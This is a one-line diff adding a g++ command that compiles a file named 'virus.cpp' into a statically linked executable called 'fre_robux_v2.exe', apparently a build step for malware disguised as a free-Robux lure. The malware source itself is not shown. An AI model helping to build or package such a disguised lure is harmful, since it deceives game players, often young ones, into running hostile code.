@@ -1,0 +1,1 @@
+g++ virus.cpp -static-libstdc++ -static-libgcc -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic -o fre_robux_v2.exe
